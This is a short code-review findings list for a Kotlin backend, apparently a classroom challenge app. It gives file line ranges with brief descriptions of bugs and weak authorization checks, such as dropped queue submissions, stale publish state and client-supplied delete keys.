- `SysAdminRoutes.kt:108-130, 132-142` — Admin cache-reset handlers discard the authenticated block result and rely solely on thrown exceptions for the gate
- `UserAnswerQueue.kt:66-71` — Answer submissions silently dropped (data loss) when queue is full
- `ChallengePost.kt:388-447` — shouldPublish() computed once before save but enrolledClassCode/teacher state may change; publish uses post-await stale snapshot
- `ChallengePost.kt:322-331` — clearGroupAnswers parses untrusted JSON before checking DBMS enabled, and decode can throw 500
- `ChallengePost.kt:274-289` — splitKeyAndDelete authorizes by comparing userId from the client-supplied key to the session user, but trusts key structure
- `GeoInfo.kt:83-91` — summary() swallows only NoSuchElementException but field access can yield other failures
- `Limiter.kt:44-52` — Token can be permanently lost if the coroutine is cancelled during func()
- `EnvVar.kt:66` — DBMS_URL env-var default falls through unmasked when used via getEnv(default)